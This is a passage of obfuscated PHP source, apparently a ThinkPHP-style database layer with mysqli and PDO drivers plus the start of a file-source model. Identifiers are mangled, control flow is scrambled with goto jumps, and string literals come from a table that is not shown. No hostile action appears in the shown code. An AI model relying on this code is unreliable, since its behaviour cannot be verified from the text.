NULL) { $d˜–‡¬¬ˆä->free_result(); } } goto C—ÇÛ„±©; C—ÇÛ„±©: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto a”ôº ÖÖ›; a”ôº ÖÖ›: } public function execute($AÀÅ¶ÅÄ³¥) { goto b¶Â†¹¢Ê×; b¶Â†¹¢Ê×: $C˜æ¾„Šå =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÃ•à×½÷ˆ; E‹Ø¬³¿¾³: think_status($C˜æ¾„Šå[20]); $DÌ¶õŞ•Õ¡ = $this->_linkID->query($AÀÅ¶ÅÄ³¥); $this->debug(); goto a‡Ç•Äõ¹ğ; aÃ•à×½÷ˆ: $this->queryStr = $AÀÅ¶ÅÄ³¥; if ($this->queryID) { $this->free(); } think_action_status($C˜æ¾„Šå[21], 1); goto E‹Ø¬³¿¾³; a‡Ç•Äõ¹ğ: if (!1 === $DÌ¶õŞ•Õ¡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto d’…¶ëŞé; d’…¶ëŞé: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C´´¯êíç = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$C´´¯êíç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c¨‘•‹ˆ³ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c¨‘•‹ˆ³) { $this->error(); return !1; } } return !0; } private function getAll() { $fªœöÌâ‘Ì = array(); if ($this->numRows > 0) { for ($bä·°ïÎ¦ó = 0; $bä·°ïÎ¦ó < $this->numRows; $bä·°ïÎ¦ó++) { $fªœöÌâ‘Ì[$bä·°ïÎ¦ó] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $fªœöÌâ‘Ì; } public function getFields($eâ«æ’ñ£®) { $FÚ İç¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Dô±Ôïšİ‡ = $this->query($FÚ İç¸[880] . $this->parseKey($eâ«æ’ñ£®)); $F“Àñ„ = array(); if ($Dô±Ôïšİ‡) { foreach ($Dô±Ôïšİ‡ as $aÄ…ÛÁ¥°ñ => $eÈáŠ—õ×) { $F“Àñ„[$eÈáŠ—õ×[$FÚ İç¸[27]]] = array($FÚ İç¸[28] => $eÈáŠ—õ×[$FÚ İç¸[27]], $FÚ İç¸[29] => $eÈáŠ—õ×[$FÚ İç¸[30]], $FÚ İç¸[31] => (bool) ($eÈáŠ—õ×[$FÚ İç¸[32]] === $FÚ İç¸[33]), $FÚ İç¸[34] => $eÈáŠ—õ×[$FÚ İç¸[35]], $FÚ İç¸[36] => strtolower($eÈáŠ—õ×[$FÚ İç¸[37]]) == $FÚ İç¸[38], $FÚ İç¸[39] => strtolower($eÈáŠ—õ×[$FÚ İç¸[40]]) == $FÚ İç¸[41]); } } return $F“Àñ„; } public function getTables($c…¨ñÒ‰‰Ğ = '') { $D‡­À‘£„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a Úîãëßí = !empty($c…¨ñÒ‰‰Ğ) ? $D‡­À‘£„[882] . $c…¨ñÒ‰‰Ğ . $D‡­À‘£„[883] : $D‡­À‘£„[884]; $Bùµõ˜‰µ¼ = $this->query($a Úîãëßí); $D¾‚ô¸ÏŒ‰ = array(); if ($Bùµõ˜‰µ¼) { foreach ($Bùµõ˜‰µ¼ as $dê²¼†Ó¬ => $DÆø—åíÒº) { $D¾‚ô¸ÏŒ‰[$dê²¼†Ó¬] = current($DÆø—åíÒº); } } return $D¾‚ô¸ÏŒ‰; } public function replace($D¨ÇÇ«˜Æ·, $bôËäöƒ†‡ = array()) { $B˜İäôÛø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($D¨ÇÇ«˜Æ· as $A·“…ƒµ¹’ => $d¬ã±åÈ») { $bÓ·Æ§¨çÙ = $this->parseValue($d¬ã±åÈ»); if (is_scalar($bÓ·Æ§¨çÙ)) { $D¡Éòˆ¨Ã[] = $bÓ·Æ§¨çÙ; $b¿ÃùÃœ[] = $this->parseKey($A·“…ƒµ¹’); } } $AÂ’Ùö‘İ¢ = $B˜İäôÛø[885] . $this->parseTable($bôËäöƒ†‡[$B˜İäôÛø[277]]) . $B˜İäôÛø[886] . implode($B˜İäôÛø[47], $b¿ÃùÃœ) . $B˜İäôÛø[887] . implode($B˜İäôÛø[47], $D¡Éòˆ¨Ã) . $B˜İäôÛø[888]; return $this->execute($AÂ’Ùö‘İ¢); } public function insertAll($BÃ÷ì¿¡‰ó, $e‰ßƒ˜…Ô = array(), $b‹…À´£“ = false) { goto B„“‡ƒÚ›í; B„“‡ƒÚ›í: $F¥ö’İ‚ò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!is_array($BÃ÷ì¿¡‰ó[0])) { return !1; } $CÛ‹¿ã²· = array_keys($BÃ÷ì¿¡‰ó[0]); goto a‡ÉÃØæ; a‡ÉÃØæ: $aøÍóÎ“à¹ = array(); foreach ($BÃ÷ì¿¡‰ó as $B£ÇÊÕÄ÷°) { $a‚í‹ßª÷Ÿ = array(); foreach ($B£ÇÊÕÄ÷° as $C…µŒ£ö•¸ => $E÷ç÷ÉçÅá) { $E÷ç÷ÉçÅá = $this->parseValue($E÷ç÷ÉçÅá); if (is_scalar($E÷ç÷ÉçÅá)) { $a‚í‹ßª÷Ÿ[] = $E÷ç÷ÉçÅá; } } $aøÍóÎ“à¹[] = $F¥ö’İ‚ò[258] . implode($F¥ö’İ‚ò[47], $a‚í‹ßª÷Ÿ) . $F¥ö’İ‚ò[888]; } array_walk($CÛ‹¿ã²·, array($this, $F¥ö’İ‚ò[889])); goto bÙ”œ—Œ›Ù; bÙ”œ—Œ›Ù: $b¥•òÔß‹ = $b‹…À´£“ ? $F¥ö’İ‚ò[890] : $F¥ö’İ‚ò[891]; $f„ŒÑ¿Ò = $b¥•òÔß‹ . $F¥ö’İ‚ò[892] . $this->parseTable($e‰ßƒ˜…Ô[$F¥ö’İ‚ò[277]]) . $F¥ö’İ‚ò[886] . implode($F¥ö’İ‚ò[47], $CÛ‹¿ã²·) . $F¥ö’İ‚ò[893] . implode($F¥ö’İ‚ò[47], $aøÍóÎ“à¹); return $this->execute($f„ŒÑ¿Ò); goto eÏ´‚Ğ”›; eÏ´‚Ğ”›: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Aİóõó“•² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->error = $this->_linkID->errno . $Aİóõó“•²[4] . $this->_linkID->error; if ($Aİóõó“•²[33] != $this->queryStr) { $this->error .= LNG($Aİóõó“•²[45]) . $this->queryStr; } think_trace($this->error, $Aİóõó“•²[33], $Aİóõó“•²[46]); return $this->error; } public function escapeString($FğÊ¨Ôñ«¨) { if ($this->_linkID) { return $this->_linkID->real_escape_string($FğÊ¨Ôñ«¨); } else { return addslashes($FğÊ¨Ôñ«¨); } } public function parseKey(&$fôÓìó²˜², $bÏ”—œİ¸Â = true) { $A´ÃŸèÃÅ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($bÏ”—œİ¸Â) { $fôÓìó²˜² = $this->parseKeyCheck($fôÓìó²˜²); } if ($fôÓìó²˜² != $A´ÃŸèÃÅ[182] && !preg_match($A´ÃŸèÃÅ[894], $fôÓìó²˜²)) { $fôÓìó²˜² = $A´ÃŸèÃÅ[383] . trim($fôÓìó²˜², $A´ÃŸèÃÅ[383]) . $A´ÃŸèÃÅ[383]; } return $fôÓìó²˜²; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($d¬¼…İ°Ú = '') { $EƒÄä ¼Û =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!class_exists($EƒÄä ¼Û[896])) { think_exception(think_lang($EƒÄä ¼Û[10]) . $EƒÄä ¼Û[897]); } if (!empty($d¬¼…İ°Ú)) { $this->config = $d¬¼…İ°Ú; if (empty($this->config[$EƒÄä ¼Û[13]])) { $this->config[$EƒÄä ¼Û[13]] = array(); } } } public function connect($A›±åÊß¦‡ = '', $có•°‡ãë = 0) { $CİÁïÕ•ÉÚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($this->linkID[$có•°‡ãë])) { goto dÜÚß…øİ‹; bŒ²‘Ïí÷¯: if (1 != think_config($CİÁïÕ•ÉÚ[18])) { unset($this->config); } goto dµäâ»¨µ; E À»¤¢ÆÃ: if (!$this->linkID[$có•°‡ãë]) { think_exception($CİÁïÕ•ÉÚ[906]); } try { $this->linkID[$có•°‡ãë]->exec($CİÁïÕ•ÉÚ[907] . think_config($CİÁïÕ•ÉÚ[874])); } catch (Exception $d›ø§µÂÒ) { } $this->connected = !0; goto bŒ²‘Ïí÷¯; fÌ¸øĞÅŞ×: try { $this->linkID[$có•°‡ãë] = new PDO($A›±åÊß¦‡[$CİÁïÕ•ÉÚ[898]], $A›±åÊß¦‡[$CİÁïÕ•ÉÚ[871]], $A›±åÊß¦‡[$CİÁïÕ•ÉÚ[872]], $A›±åÊß¦‡[$CİÁïÕ•ÉÚ[13]]); } catch (PDOException $d›ø§µÂÒ) { think_exception($d›ø§µÂÒ->getMessage()); } $this->dbType = $this->_getDsnType($A›±åÊß¦‡[$CİÁïÕ•ÉÚ[898]]); if (in_array($this->dbType, array($CİÁïÕ•ÉÚ[899], $CİÁïÕ•ÉÚ[900], $CİÁïÕ•ÉÚ[901], $CİÁïÕ•ÉÚ[902]))) { think_exception($CİÁïÕ•ÉÚ[903] . $this->dbType . $CİÁïÕ•ÉÚ[904] . $this->dbType . $CİÁïÕ•ÉÚ[905]); } goto E À»¤¢ÆÃ; dÜÚß…øİ‹: if (empty($A›±åÊß¦‡)) { $A›±åÊß¦‡ = $this->config; } $fš‘é¿ÓÏ“ = !empty($A›±åÊß¦‡[$CİÁïÕ•ÉÚ[13]][$CİÁïÕ•ÉÚ[14]]) ? $A›±åÊß¦‡[$CİÁïÕ•ÉÚ[13]][$CİÁïÕ•ÉÚ[14]] : $this->pconnect; if ($fš‘é¿ÓÏ“) { $A›±åÊß¦‡[$CİÁïÕ•ÉÚ[13]][PDO::ATTR_PERSISTENT] = !0; } goto fÌ¸øĞÅŞ×; dµäâ»¨µ: } return $this->linkID[$có•°‡ãë]; } public function free() { $this->PDOStatement = null; } public function query($AŸóó²«Í¥, $b¦¾Õ—ÑŒ = array()) { goto fÕã¥õ‡½; eˆŸÈÉ¼šƒ: $this->queryStr = $AŸóó²«Í¥; if (!empty($b¦¾Õ—ÑŒ)) { $this->queryStr .= $fÉò¥ã ¹‘[908] . print_r($b¦¾Õ—ÑŒ, !0) . $fÉò¥ã ¹‘[909]; } if (!empty($this->PDOStatement)) { $this->free(); } goto B­‡Ü‹¾²…; A•·¨™»Ôœ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $D£—˜¹õ„Ï = $this->PDOStatement->execute($b¦¾Õ—ÑŒ); $this->debug(); goto a§Ó¥åÉ¢¶; fÕã¥õ‡½: $fÉò¥ã ¹‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eˆŸÈÉ¼šƒ; B­‡Ü‹¾²…: think_action_status($fÉò¥ã ¹‘[19], 1); think_status($fÉò¥ã ¹‘[20]); $this->PDOStatement = $this->_linkID->prepare($AŸóó²«Í¥); goto A•·¨™»Ôœ; a§Ó¥åÉ¢¶: if (!1 === $D£—˜¹õ„Ï) { $this->error(); return !1; } else { return $this->getAll(); } goto a•†‚Õ¢ŒÅ; a•†‚Õ¢ŒÅ: } public function execute($aˆÒÌÑ…‡ù, $cˆÆ‹Û¨‘à = array()) { goto B ©È¡´× ; dÆé²‚ÛË: think_status($F£×î¦—¸[20]); $this->PDOStatement = $this->_linkID->prepare($aˆÒÌÑ…‡ù); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto EÂ¢½Ä«¶; B ©È¡´× : $F£×î¦—¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AÔé®Âõ¥Œ; BĞ‡µóÇ½Ú: if ($this->dbType == $F£×î¦—¸[902]) { if (preg_match($F£×î¦—¸[910], $this->queryStr, $BâÄùÊ®Œ)) { $this->table = think_config($F£×î¦—¸[911]) . str_ireplace(think_config($F£×î¦—¸[912]), $F£×î¦—¸[376], $BâÄùÊ®Œ[2]); $e›„´‡è„ø = (bool) $this->query($F£×î¦—¸[913] . strtoupper($this->table) . $F£×î¦—¸[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($F£×î¦—¸[21], 1); goto dÆé²‚ÛË; EÂ¢½Ä«¶: $F‚ñÌ¿íœİ = $this->PDOStatement->execute($cˆÆ‹Û¨‘à); $this->debug(); if (!1 === $F‚ñÌ¿íœİ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($e›„´‡è„ø || preg_match($F£×î¦—¸[914], $aˆÒÌÑ…‡ù)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto c­˜ëåÀ¬´; AÔé®Âõ¥Œ: $this->queryStr = $aˆÒÌÑ…‡ù; if (!empty($cˆÆ‹Û¨‘à)) { $this->queryStr .= $F£×î¦—¸[908] . print_r($cˆÆ‹Û¨‘à, !0) . $F£×î¦—¸[909]; } $e›„´‡è„ø = !1; goto BĞ‡µóÇ½Ú; c­˜ëåÀ¬´: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dóäî’Ìó = $this->_linkID->commit(); $this->transTimes = 0; if (!$dóäî’Ìó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d‹Ã²Áæõ¡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$d‹Ã²Áæõ¡) { $this->error(); return !1; } } return !0; } private function getAll() { $E¢ÕĞÜ ÕÎ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($E¢ÕĞÜ ÕÎ); return $E¢ÕĞÜ ÕÎ; } public function getFields($A¾¯ë„ÖÂ) { goto D’Î†îµÌŞ; D’Î†îµÌŞ: $BÍ°Ÿ™…Ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!0); if (think_config($BÍ°Ÿ™…Ì[915])) { $då¯×öâ©Ñ = str_replace($BÍ°Ÿ™…Ì[916], $A¾¯ë„ÖÂ, think_config($BÍ°Ÿ™…Ì[915])); } else { switch ($this->dbType) { case $BÍ°Ÿ™…Ì[899]: case $BÍ°Ÿ™…Ì[917]: $då¯×öâ©Ñ = "\123\x45\x4c\105\103\x54\x20\x20\40\x63\x6f\x6c\x75\x6d\x6e\137\156\141\x6d\x65\x20\141\163\x20\47\x4e\141\155\x65\x27\x2c\40\x20\x20\x64\x61\164\141\137\164\171\160\x65\x20\141\x73\x20\47\124\171\x70\145\x27\54\x20\x20\x20\143\157\154\165\155\x6e\137\x64\145\x66\141\165\x6c\x74\40\141\x73\x20\47\104\x65\x66\141\x75\x6c\164\47\54\x20\x20\x20\x69\163\137\156\x75\154\x6c\141\142\154\145\40\141\163\x20\47\x4e\165\154\x6c\x27\xa\x9\x9\x46\122\x4f\x4d\x9\x69\x6e\x66\157\162\155\141\x74\151\157\x6e\x5f\163\143\150\145\155\x61\56\164\x61\142\x6c\x65\x73\x20\x41\x53\x20\x74\12\11\x9\x4a\x4f\x49\x4e\11\x69\x6e\146\x6f\162\155\x61\x74\151\157\156\x5f\x73\143\x68\x65\x6d\141\x2e\143\157\x6c\165\155\156\x73\x20\101\123\x20\x63\xa\11\x9\x4f\x4e\40\x20\x74\x2e\164\x61\x62\x6c\x65\x5f\143\141\164\141\x6c\157\147\40\75\x20\143\x2e\164\x61\x62\154\145\137\x63\x61\164\x61\x6c\x6f\x67\xa\11\x9\101\x4e\104\x20\164\x2e\164\x61\x62\x6c\x65\137\x73\x63\150\145\x6d\x61\40\75\40\x63\56\x74\141\142\154\145\137\x73\x63\x68\x65\155\141\12\11\11\101\116\104\x20\x74\56\164\141\x62\154\145\x5f\156\141\x6d\x65\x20\x3d\x20\x63\x2e\164\x61\x62\x6c\x65\137\x6e\x61\155\145\xa\x9\x9\x57\x48\x45\122\105\x20\x20\x20\x74\56\x74\141\142\x6c\x65\x5f\156\x61\x6d\x65\x20\x3d\x20\x27{$A¾¯ë„ÖÂ}\47"; break; case $BÍ°Ÿ™…Ì[918]: $då¯×öâ©Ñ = $BÍ°Ÿ™…Ì[919] . $A¾¯ë„ÖÂ . $BÍ°Ÿ™…Ì[920]; break; case $BÍ°Ÿ™…Ì[900]: case $BÍ°Ÿ™…Ì[902]: $då¯×öâ©Ñ = $BÍ°Ÿ™…Ì[921] . $BÍ°Ÿ™…Ì[922] . $BÍ°Ÿ™…Ì[923] . strtoupper($A¾¯ë„ÖÂ) . $BÍ°Ÿ™…Ì[924] . strtoupper($A¾¯ë„ÖÂ) . $BÍ°Ÿ™…Ì[925]; break; case $BÍ°Ÿ™…Ì[926]: $då¯×öâ©Ñ = $BÍ°Ÿ™…Ì[927] . $A¾¯ë„ÖÂ . $BÍ°Ÿ™…Ì[928]; break; case $BÍ°Ÿ™…Ì[901]: break; case $BÍ°Ÿ™…Ì[929]: default: $då¯×öâ©Ñ = $BÍ°Ÿ™…Ì[930] . ($this->dbType == $BÍ°Ÿ™…Ì[929] ? "\140{$A¾¯ë„ÖÂ}\140" : $A¾¯ë„ÖÂ); } } goto E…Ğù°˜ºÈ; E…Ğù°˜ºÈ: $FĞï ’¶ = $this->query($då¯×öâ©Ñ); $Fâ²Ä†©¹§ = array(); if ($FĞï ’¶) { foreach ($FĞï ’¶ as $AæÓŒÒ®¦ => $f¿¸…òêÕÀ) { $f¿¸…òêÕÀ = array_change_key_case($f¿¸…òêÕÀ); $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[28]] = isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[28]]) ? $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[28]] : $BÍ°Ÿ™…Ì[376]; $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[29]] = isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[29]]) ? $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[29]] : $BÍ°Ÿ™…Ì[376]; $CÛÖ‚ºôš = isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[271]]) ? $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[271]] : $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[28]]; $Fâ²Ä†©¹§[$CÛÖ‚ºôš] = array($BÍ°Ÿ™…Ì[28] => $CÛÖ‚ºôš, $BÍ°Ÿ™…Ì[29] => $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[29]], $BÍ°Ÿ™…Ì[31] => (bool) (isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[103]]) && $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[103]] === $BÍ°Ÿ™…Ì[33] || isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[31]]) && $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[31]] === $BÍ°Ÿ™…Ì[33]), $BÍ°Ÿ™…Ì[34] => isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[34]]) ? $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[34]] : (isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[53]]) ? $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[53]] : $BÍ°Ÿ™…Ì[376]), $BÍ°Ÿ™…Ì[36] => isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[93]]) ? strtolower($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[93]]) == $BÍ°Ÿ™…Ì[38] : (isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[54]]) ? $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[54]] : !1), $BÍ°Ÿ™…Ì[39] => isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[931]]) ? strtolower($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[931]]) == $BÍ°Ÿ™…Ì[41] : (isset($f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[93]]) ? $f¿¸…òêÕÀ[$BÍ°Ÿ™…Ì[93]] : !1)); } } goto c“ë¾„ö’ˆ; c“ë¾„ö’ˆ: return $Fâ²Ä†©¹§; goto CÂ§ã£“éŠ; CÂ§ã£“éŠ: } public function getTables($dĞó¹ëÕ¢‘ = '') { $dÍ§¶‡æ² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (think_config($dÍ§¶‡æ²[932])) { $C†Îå‹º¯ = str_replace($dÍ§¶‡æ²[933], $dĞó¹ëÕ¢‘, think_config($dÍ§¶‡æ²[932])); } else { switch ($this->dbType) { case $dÍ§¶‡æ²[900]: case $dÍ§¶‡æ²[902]: $C†Îå‹º¯ = $dÍ§¶‡æ²[934]; break; case $dÍ§¶‡æ²[899]: case $dÍ§¶‡æ²[917]: $C†Îå‹º¯ = $dÍ§¶‡æ²[935]; break; case $dÍ§¶‡æ²[926]: $C†Îå‹º¯ = $dÍ§¶‡æ²[936]; break; case $dÍ§¶‡æ²[901]: think_exception(think_lang($dÍ§¶‡æ²[937]) . $dÍ§¶‡æ²[938]); break; case $dÍ§¶‡æ²[918]: $C†Îå‹º¯ = $dÍ§¶‡æ²[42] . $dÍ§¶‡æ²[43] . $dÍ§¶‡æ²[44]; break; case $dÍ§¶‡æ²[929]: default: if (!empty($dĞó¹ëÕ¢‘)) { $C†Îå‹º¯ = $dÍ§¶‡æ²[882] . $dĞó¹ëÕ¢‘ . $dÍ§¶‡æ²[883]; } else { $C†Îå‹º¯ = $dÍ§¶‡æ²[884]; } } } $cÂÖÈ„°ÉÇ = $this->query($C†Îå‹º¯); $dÃ¯Á©£Ï = array(); foreach ($cÂÖÈ„°ÉÇ as $FË©èÀä°ñ => $CÈ­Å¾¢) { $dÃ¯Á©£Ï[$FË©èÀä°ñ] = current($CÈ­Å¾¢); } return $dÃ¯Á©£Ï; } protected function parseLimit($c·Òµ’êå) { $DÜ·éÍÛ‡² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e …¶ğÑøŠ = $DÜ·éÍÛ‡²[33]; if (!empty($c·Òµ’êå)) { switch ($this->dbType) { case $DÜ·éÍÛ‡²[926]: case $DÜ·éÍÛ‡²[918]: $c·Òµ’êå = explode($DÜ·éÍÛ‡²[47], $c·Òµ’êå); if (count($c·Òµ’êå) > 1) { $e …¶ğÑøŠ .= $DÜ·éÍÛ‡²[48] . $c·Òµ’êå[1] . $DÜ·éÍÛ‡²[49] . $c·Òµ’êå[0] . $DÜ·éÍÛ‡²[50]; } else { $e …¶ğÑøŠ .= $DÜ·éÍÛ‡²[48] . $c·Òµ’êå[0] . $DÜ·éÍÛ‡²[50]; } break; case $DÜ·éÍÛ‡²[899]: case $DÜ·éÍÛ‡²[917]: break; case $DÜ·éÍÛ‡²[901]: break; case $DÜ·éÍÛ‡²[900]: case $DÜ·éÍÛ‡²[902]: break; case $DÜ·éÍÛ‡²[929]: default: $e …¶ğÑøŠ .= $DÜ·éÍÛ‡²[48] . $c·Òµ’êå . $DÜ·éÍÛ‡²[50]; } } return $e …¶ğÑøŠ; } public function parseKey(&$F·˜ÈÔƒÎ÷, $C–°©ÈÇ¿— = true) { $AõŞíÜ«»Œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($C–°©ÈÇ¿—) { $F·˜ÈÔƒÎ÷ = $this->parseKeyCheck($F·˜ÈÔƒÎ÷); } if ($this->dbType == $AõŞíÜ«»Œ[929]) { if ($F·˜ÈÔƒÎ÷ != $AõŞíÜ«»Œ[182] && !preg_match($AõŞíÜ«»Œ[894], $F·˜ÈÔƒÎ÷)) { $F·˜ÈÔƒÎ÷ = $AõŞíÜ«»Œ[383] . trim($F·˜ÈÔƒÎ÷, $AõŞíÜ«»Œ[383]) . $AõŞíÜ«»Œ[383]; } return $F·˜ÈÔƒÎ÷; } else { return parent::parseKey($F·˜ÈÔƒÎ÷, $C–°©ÈÇ¿—); } } public function close() { $this->_linkID = null; } public function error() { $AÅÊ¶Ë„á =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->PDOStatement) { $Bá¢¹†½ŞÍ = $this->PDOStatement->errorInfo(); $this->error = $Bá¢¹†½ŞÍ[1] . $AÅÊ¶Ë„á[4] . $Bá¢¹†½ŞÍ[2]; } else { $this->error = $AÅÊ¶Ë„á[33]; } if ($AÅÊ¶Ë„á[33] != $this->queryStr) { $this->error .= LNG($AÅÊ¶Ë„á[45]) . $this->queryStr; } think_trace($this->error, $AÅÊ¶Ë„á[33], $AÅÊ¶Ë„á[46]); return $this->error; } public function escapeString($C‰›âÀ‰Ê·) { $dÏ–ºÃ”³Ò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; switch ($this->dbType) { case $dÏ–ºÃ”³Ò[926]: case $dÏ–ºÃ”³Ò[899]: case $dÏ–ºÃ”³Ò[917]: case $dÏ–ºÃ”³Ò[929]: return addslashes($C‰›âÀ‰Ê·); case $dÏ–ºÃ”³Ò[901]: case $dÏ–ºÃ”³Ò[918]: case $dÏ–ºÃ”³Ò[900]: case $dÏ–ºÃ”³Ò[902]: return str_ireplace($dÏ–ºÃ”³Ò[55], $dÏ–ºÃ”³Ò[56], $C‰›âÀ‰Ê·); } } protected function parseValue($D”Ÿ…ô¾£) { $C…ãÂ›¡‚™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_string($D”Ÿ…ô¾£)) { $a•ÛØ³Äà = strpos($D”Ÿ…ô¾£, $C…ãÂ›¡‚™[4]) === 0 && in_array($D”Ÿ…ô¾£, array_keys($this->bind)); $D”Ÿ…ô¾£ = $a•ÛØ³Äà ? $this->escapeString($D”Ÿ…ô¾£) : $C…ãÂ›¡‚™[939] . $this->escapeString($D”Ÿ…ô¾£) . $C…ãÂ›¡‚™[939]; } elseif (isset($D”Ÿ…ô¾£[0]) && is_string($D”Ÿ…ô¾£[0]) && strtolower($D”Ÿ…ô¾£[0]) == $C…ãÂ›¡‚™[295]) { $D”Ÿ…ô¾£ = $this->escapeString($D”Ÿ…ô¾£[1]); } elseif (is_array($D”Ÿ…ô¾£)) { $D”Ÿ…ô¾£ = array_map(array($this, $C…ãÂ›¡‚™[940]), $D”Ÿ…ô¾£); } elseif (is_bool($D”Ÿ…ô¾£)) { $D”Ÿ…ô¾£ = $D”Ÿ…ô¾£ ? $C…ãÂ›¡‚™[87] : $C…ãÂ›¡‚™[191]; } elseif (is_null($D”Ÿ…ô¾£)) { $D”Ÿ…ô¾£ = $C…ãÂ›¡‚™[103]; } return $D”Ÿ…ô¾£; } public function getLastInsertId() { $f µóĞŒëÓ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; switch ($this->dbType) { case $f µóĞŒëÓ[926]: case $f µóĞŒëÓ[918]: case $f µóĞŒëÓ[899]: case $f µóĞŒëÓ[917]: case $f µóĞŒëÓ[901]: case $f µóĞŒëÓ[929]: return $this->_linkID->lastInsertId(); case $f µóĞŒëÓ[900]: case $f µóĞŒëÓ[902]: $dî÷…”ãö = $this->table; $BãÈ°œ¾ô = $this->query("\123\105\x4c\105\x43\124\x20{$dî÷…”ãö}\x2e\x63\165\162\162\166\x61\x6c\40\x63\165\162\162\x76\x61\x6c\x20\106\122\117\x4d\x20\144\165\x61\154"); return $BãÈ°œ¾ô ? $BãÈ°œ¾ô[0][$f µóĞŒëÓ[941]] : 0; } } } goto e–»–ï¼æ; AõºÚŸîé´: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dÙŒ†š²Ñ‰) { $bòÉ÷Éµ« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¤¯Õ‚ÓæÃ = Model($bòÉ÷Éµ«[507])->where(array($bòÉ÷Éµ«[1541] => $dÙŒ†š²Ñ‰))->find(); $A¬èê‚”’Ù = $this->_mkdirRoot(SourceModel::TYPE_USER, $dÙŒ†š²Ñ‰, $f¤¯Õ‚ÓæÃ[$bòÉ÷Éµ«[28]]); $this->userDesktopAdd($A¬èê‚”’Ù); return $A¬èê‚”’Ù; } public function userDesktopAdd($dŒÌËÍ‚Ş) { $dƒÁ¥‡«‰Û =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b·›ï¡®Î = LNG($dƒÁ¥‡«‰Û[1979]); $A‘¤©·ÒöÃ = $this->mkdir($dŒÌËÍ‚Ş, $b·›ï¡®Î); $this->metaSet($A‘¤©·ÒöÃ, $dƒÁ¥‡«‰Û[1980], $dƒÁ¥‡«‰Û[87]); $this->metaSet($dŒÌËÍ‚Ş, $dƒÁ¥‡«‰Û[1981], $A‘¤©·ÒöÃ); } public function groupRootAdd($f’ô‘˜»‹) { $aãÃöØÎ¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Aã°Õ£ê‹É = Model($aãÃöØÎ¤[516])->where(array($aãÃöØÎ¤[1803] => $f’ô‘˜»‹))->find(); return 